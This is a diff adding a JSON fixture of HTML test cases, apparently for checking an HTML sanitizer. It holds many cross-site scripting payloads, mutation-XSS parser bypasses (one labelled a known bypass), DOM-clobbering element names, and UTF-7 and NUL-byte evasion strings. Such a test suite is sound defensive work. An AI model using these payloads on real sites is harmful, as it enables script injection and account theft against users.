+    "name": "print-only and dark-scheme styles",
+    "html": "<style>@media print { p { background: url(http://css.invalid/print.png) } } @media (prefers-color-scheme: dark) { p { color: white } }</style><p>p</p>"
+  },
+  {
+    "name": "styles that target the frame’s own placeholders",
+    "html": "<style>.html-preview-image { background: url(http://css.invalid/ph.png); width: 9999px }</style><img src=\"http://img.invalid/a.png\" alt=\"ph\">"
+  },
+  {
+    "name": "form named body",
+    "html": "<form name=\"body\"><input name=\"x\"></form><p>after</p>"
+  },
+  {
+    "name": "img named adoptedStyleSheets",
+    "html": "<img name=\"adoptedStyleSheets\" src=\"http://img.invalid/c.png\">"
+  },
+  {
+    "name": "forms named after what the page uses",
+    "html": "<form name=\"defaultView\"></form><form name=\"documentElement\"></form><form name=\"querySelectorAll\"></form><form name=\"createElement\"></form><form name=\"importNode\"></form><form name=\"head\"></form><form name=\"scrollingElement\"></form>"
+  },
+  {
+    "name": "embed and object named after the document’s properties",
+    "html": "<embed name=\"createTreeWalker\"><object name=\"adoptedStyleSheets\"></object><iframe name=\"defaultView\"></iframe>"
+  },
+  {
+    "name": "form controls named after the form’s properties",
+    "html": "<form id=\"hp\" style=\"color:red\"><input name=\"style\"><input name=\"attributes\"><input name=\"removeAttribute\"><input name=\"getAttribute\"><input name=\"setAttribute\"><input name=\"localName\"><input name=\"namespaceURI\"><input name=\"parentNode\"><input name=\"childNodes\"><input name=\"isConnected\"><input name=\"replaceWith\"><input name=\"remove\"></form>"
+  },
+  {
+    "name": "ids that shadow window properties",
+    "html": "<a id=\"CSSStyleSheet\">a</a><a id=\"DOMParser\">b</a><a id=\"frameElement\">c</a><a id=\"parent\" name=\"top\">d</a><div id=\"__proto__\">e</div><img id=\"x\" name=\"x\" src=\"http://img.invalid/x.png\">"
+  },
+  {
+    "name": "noscript with a title that closes it",
+    "html": "<noscript><p title=\"</noscript><img src=x onerror={{CANARY}}>\"></noscript>"
+  },
+  {
+    "name": "template with a style that would swallow",
+    "html": "<template><style></template><img src=x onerror=\"{{CANARY}}\">"
+  },
+  {
+    "name": "math, mtext, table, mglyph, style",
+    "html": "<math><mtext><table><mglyph><style><img src=x onerror=\"{{CANARY}}\">"
+  },
+  {
+    "name": "svg, a stray </p>, style with an attribute that closes it",
+    "html": "<svg></p><style><a id=\"</style><img src=x onerror={{CANARY}}>\">"
+  },
+  {
+    "name": "math in svg in math with a textarea",
+    "html": "<math><mi><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror={{CANARY}} src=1>\">"
+  },
+  {
+    "name": "nested forms with math and mglyph (a known bypass)",
+    "html": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=\"{{CANARY}}\">"
+  },
+  {
+    "name": "comment tricks",
+    "html": "<!--><img src=x onerror=\"{{CANARY}}\">--> <!-- --!><img src=x onerror=\"{{CANARY}}\">--> <!--[if IE]><script>{{CANARY}}</script><![endif]-->"
+  },
+  {
+    "name": "conditional comments of a mail template",
+    "html": "<!--[if mso]><v:rect xmlns:v=\"urn:schemas-microsoft-com:vml\" fill=\"true\"><v:fill src=\"http://img.invalid/vml.png\"/></v:rect><![endif]--><p>mail</p><!--[if !mso]><!--><p>not outlook</p><!--<![endif]-->"
+  },
+  {
+    "name": "plaintext",
+    "html": "<plaintext><img src=x onerror=\"{{CANARY}}\">"
+  },
+  {
+    "name": "xmp",
+    "html": "<xmp><img src=x onerror=\"{{CANARY}}\"></xmp>"
+  },
+  {
+    "name": "noembed and noframes",
+    "html": "<noembed><img src=x onerror=\"{{CANARY}}\"></noembed><noframes><img src=x onerror=\"{{CANARY}}\"></noframes>"
+  },
+  {
+    "name": "iframe text",
+    "html": "<iframe><img src=x onerror=\"{{CANARY}}\"></iframe>"
+  },
+  {
+    "name": "textarea and title text",
+    "html": "<textarea><img src=x onerror=\"{{CANARY}}\"></textarea><title><img src=x onerror=\"{{CANARY}}\"></title>"
+  },
+  {
+    "name": "style text with a tag",
+    "html": "<style><img src=x onerror=\"{{CANARY}}\"></style><p>s</p>"
+  },
+  {
+    "name": "svg style with an element child",
+    "html": "<svg><style><img src=x onerror=\"{{CANARY}}\"></style></svg>"
+  },
+  {
+    "name": "svg style whose text closes an HTML style",
+    "html": "<svg><style>&lt;/style&gt;&lt;img src=x onerror={{CANARY}}&gt;</style></svg><p>copy</p>"
+  },
+  {
+    "name": "math style",
+    "html": "<math><style><img src=x onerror=\"{{CANARY}}\"></style></math>"
+  },
+  {
+    "name": "select with a style",
+    "html": "<select><style><img src=x onerror=\"{{CANARY}}\"></style><option>o</option></select>"
+  },
+  {
+    "name": "svg CDATA",
+    "html": "<svg><![CDATA[<img src=x onerror=\"{{CANARY}}\">]]></svg>"
+  },
+  {
+    "name": "annotation-xml with HTML",
+    "html": "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=\"{{CANARY}}\"><style>p{background:url(http://css.invalid/ax.png)}</style></annotation-xml></math>"
+  },
+  {
+    "name": "declarative shadow root",
+    "html": "<div><template shadowrootmode=\"open\"><img src=x onerror=\"{{CANARY}}\"><slot></slot></template>light</div>"
+  },
+  {
+    "name": "a tag name with a slash and attributes without spaces",
+    "html": "<img/src=\"x\"/onerror=\"{{CANARY}}\"><svg/onload=\"{{CANARY}}\">"
+  },
+  {
+    "name": "attributes in the closing tag",
+    "html": "<p>x</p onclick=\"{{CANARY}}\">"
+  },
+  {
+    "name": "meta charset UTF-7",
+    "html": "<meta charset=\"utf-7\">+ADw-script+AD4-{{CANARY}}+ADw-/script+AD4-"
+  },
+  {
+    "name": "meta http-equiv content type UTF-7",
+    "html": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-7\">+ADw-img src=x onerror={{CANARY}}+AD4-"
+  },
+  {
+    "name": "meta charset ISO-2022-JP with an escape",
+    "html": "<meta charset=\"iso-2022-jp\">\u001b(J<p>yen</p>"
+  },
+  {
+    "name": "byte order mark and UTF-16 text",
+    "html": "﻿<p>﻿bom</p>"
+  },
+  {
+    "name": "NUL inside tags and attributes",
+    "html": "<img src=x on\u0000error=\"{{CANARY}}\"><a href=\"java\u0000script:{{CANARY}}\">n</a>"
+  },
+  {
+    "name": "fullwidth and look-alike characters",
+    "html": "<ａ href=\"javascript:alert(1)\">wide</ａ><a href=\"ｊａｖａｓｃｒｉｐｔ:alert(1)\">wide href</a>"
+  }
+]
